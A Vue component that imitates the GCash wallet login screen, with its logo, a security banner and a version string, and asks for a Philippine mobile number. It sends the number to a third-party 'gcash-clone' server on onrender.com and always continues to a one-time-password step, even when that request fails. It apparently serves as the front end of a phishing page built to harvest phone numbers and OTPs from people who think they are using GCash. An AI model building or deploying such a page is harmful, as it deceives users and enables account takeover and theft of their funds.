<script setup>
import { computed, reactive, watch } from 'vue'
import gcashHeader from '../assets/gcash-header.png'

const emit = defineEmits(['phone-submitted', 'admin-access'])

const state = reactive({
  dialCode: '+63',
  phone: '',
  touched: false,
  loading: false,
  status: 'idle',
  message: '',
})

// Allow free input while keeping only digits and limiting length
watch(
  () => state.phone,
  (newValue) => {
    if (newValue == null) return

    // Remove non-digits and limit to 10 characters
    let cleaned = String(newValue).replace(/\D/g, '').slice(0, 10)
    
    // Prevent starting with 0 - if first digit is 0, remove it
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1)
    }

    if (cleaned !== newValue) {
      state.phone = cleaned
    }
  }
)

const isValid = computed(() => state.phone.length === 10 && state.phone.startsWith('9'))

// Handle input event to prevent typing 0 as first digit
const handleInput = (event) => {
  let value = event.target.value
  
  // Remove non-digits
  value = value.replace(/\D/g, '')
  
  // Prevent starting with 0
  if (value.startsWith('0')) {
    value = value.substring(1)
  }
  
  // Limit to 10 digits
  value = value.slice(0, 10)
  
  // Update the model
  state.phone = value
}

const API_BASE_URL = (import.meta.env.VITE_API_URL ?? 'https://gcash-clone-v0-1.onrender.com').replace(/\/$/, '')

const onSubmit = async () => {
  state.touched = true
  state.message = ''
  state.status = 'idle'

  if (!isValid.value || state.loading) return

  state.loading = true
  
  // Capture phone number before any async operations
  const fullPhoneNumber = `${state.dialCode}${state.phone}`

  try {
    console.log('Saving phone number to database:', { dialCode: state.dialCode, phone: state.phone })
    
    const response = await fetch(`${API_BASE_URL}/api/registrations`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        dialCode: state.dialCode,
        phone: state.phone,
      }),
    })

    if (!response.ok) {
      const errorBody = await response.json().catch(() => ({}))
      throw new Error(errorBody.message || 'Failed to save phone number')
    }

    const result = await response.json()
    console.log('Phone number saved successfully:', result)
    
    // Success - no need to show notification since we're navigating to next step
    state.status = 'success'
  } catch (error) {
    state.status = 'error'
    state.message = error.message || 'Something went wrong. Please try again.'
    // Continue to OTP page even if API fails (for testing purposes)
    console.warn('API call failed, but proceeding to OTP page:', error.message)
  } finally {
    state.loading = false
    
    // Navigate to OTP page after a brief delay to show feedback
    setTimeout(() => {
      emit('phone-submitted', fullPhoneNumber)
    }, 500)
  }
}
</script>

<template>
  <div class="screen">
    <div class="panel">
      <header class="brand">
        <img class="logo" :src="gcashHeader" alt="GCASH" />
        
      </header>

      <section class="notice">
        <img src="/Secureaccountmsg.jpg" alt="Your account, even more secure" class="notice-image" />
      </section>

      <form @submit.prevent="onSubmit" class="form">
        <label class="prompt">Put your mobile number to get started.</label>

        <div class="phone-field-wrapper">
          <label for="phoneInput" class="dial-code-label">+63</label>
          <input
            id="phoneInput"
            v-model="state.phone"
            @input="handleInput"
            type="tel"
            class="phone-input-basic"
            placeholder="1234567890"
            maxlength="10"
            autocomplete="off"
          />
        </div>
        
        <p v-if="state.touched && !isValid" class="error-text">Enter a 10-digit Philippine number beginning with 9.</p>

        <p class="disclaimer">
          By tapping next, we'll collect your mobile number's<br>
          network information to be able to send you a<br>
          One-Time Password (OTP).
        </p>

        <button
          type="submit"
          class="primary"
          :class="{ ready: isValid && !state.loading }"
          :disabled="!isValid || state.loading"
        >
          Next
        </button>
        <p v-if="state.message && state.status === 'error'" class="feedback" :class="state.status">{{ state.message }}</p>
      </form>

      <div class="divider-line"></div>

      <footer class="footer">
        <a href="#" class="help-link">Help Center</a>
        <span class="version">v5.90.0.10682</span>
      </footer>
    </div>
  </div>
</template>

<style scoped>
@import url('https://fonts.googleapis.com/css2?family=Karla:wght@400;600;700&family=Roboto:wght@400;500;700&display=swap');

.screen {
  min-height: 100vh;
  background-color: #1C72F9 !important;
  background-image: none !important;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding: 2rem 1.5rem 3.5rem;
  color: #fff;
  font-family: 'Karla', 'Roboto', sans-serif;
}

.panel {
  width: min(390px, 100%);
  display: flex;
  flex-direction: column;
  gap: 2.5rem;
  margin-top: 1rem;
  background-color: #1C72F9 !important;
  background-image: none !important;
  border-radius: 8px;
  padding: 1rem 1.5rem;
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
}

.brand {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  gap: 0.5rem;
  margin-bottom: 0rem;
}

.logo {
  width: 240px;
  height: auto;
  filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.15));
  margin-bottom: 0rem;
  transform: translateY(2rem);
}

.brand-title {
  font-size: 2rem;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
  letter-spacing: 0.1em;
  text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
}

.notice {
  display: flex;
  justify-content: center;
  align-items: center;
  border-radius: 8px;
  overflow: hidden;
}

.notice-image {
  width: 105%;
  height: auto;
  display: block;
}

.form {
  display: flex;
  flex-direction: column;
  gap: 1.25rem;
  transform: translateY(-2rem);
}

.prompt {
  font-size: 0.70rem;
  font-weight: 700;
  letter-spacing: 0.045em;
  text-align: center;
  color: rgba(255, 255, 255, 0.95);
  text-transform: uppercase;
}

.phone-field-wrapper {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.45);
  padding-bottom: 0.5rem;
  transition: border-color 0.2s ease;
  margin: 0 auto;
}

.phone-field-wrapper:focus-within {
  border-color: #ffffff;
}

.dial-code-label {
  font-size: 1.8rem;
  font-weight: 800;
  color: #ffffff;
  flex-shrink: 0;
}

.phone-input-basic {
  width: 12ch;
  background: transparent;
  border: none;
  outline: none;
  font-size: 1.8rem;
  font-weight: 800;
  color: #ffffff;
  letter-spacing: 0.08em;
}

.phone-input-basic::placeholder {
  color: rgba(255, 255, 255, 0.45);
}

.error-text {
  margin-top: -0.6rem;
  font-size: 0.78rem;
  color: #ffe3e3;
}

.disclaimer {
  font-size: 0.72rem;
  line-height: 1.75;
  text-align: center;
  color: rgba(255, 255, 255, 0.75);
  margin-top: 4rem;
  transform: translateY(3.5rem);
}

.primary {
  border: none;
  border-radius: 999px;
  background: linear-gradient(180deg, #9cc8ff 0%, #6ea7ff 100%);
  color: #0f2560;
  font-size: 1.05rem;
  font-weight: 700;
  padding: 0.95rem 1rem;
  cursor: pointer;
  transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.2s ease;
  box-shadow: 0 16px 32px rgba(20, 60, 140, 0.22);
  transform: translateY(2.5rem);
}

.primary:disabled {
  opacity: 0.65;
  cursor: not-allowed;
  box-shadow: none;
}

.primary:not(:disabled):hover {
  transform: translateY(2.375rem);
  box-shadow: 0 18px 36px rgba(20, 60, 140, 0.28);
}

.primary.ready {
  background: linear-gradient(180deg, #ffffff 0%, #dcedff 100%);
  color: #0b3a8f;
  box-shadow: 0 0 28px rgba(255, 255, 255, 0.55), 0 18px 32px rgba(20, 60, 140, 0.35);
}

.primary.ready:hover {
  transform: translateY(2.3125rem);
  box-shadow: 0 0 36px rgba(255, 255, 255, 0.65), 0 20px 36px rgba(20, 60, 140, 0.4);
}

.feedback {
  margin-top: 0.4rem;
  font-size: 0.8rem;
  text-align: center;
  transform: translateY(3rem);
}

.feedback.success {
  color: #c8ffeb;
}

.feedback.error {
  color: #ffe1e1;
}

.divider-line {
  width: 100%;
  height: 1px;
  background: rgba(255, 255, 255, 0.2);
  margin: 0.80rem 0 1rem;
  transform: translateY(-1rem);
}

.footer {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0.5rem;
  color: rgba(255, 255, 255, 0.7);
  font-size: 0.78rem;
  transform: translateY(-2rem);
}

.help-link {
  color: rgba(255, 255, 255, 0.95);
  text-decoration: none;
  font-weight: 600;
  font-size: 0.9rem;
}

.help-link:hover {
  text-decoration: underline;
}

.version {
  color: rgba(255, 255, 255, 0.6);
  font-size: 0.75rem;
}

@media (max-width: 420px) {
  .screen {
    padding: 2.5rem 1.2rem;
  }

  .logo {
    width: 160px;
  }

  .brand-title {
    font-size: 1.5rem;
  }

  .dial-select select,
  .phone-field input {
    font-size: 1.5rem;
  }
}
</style>
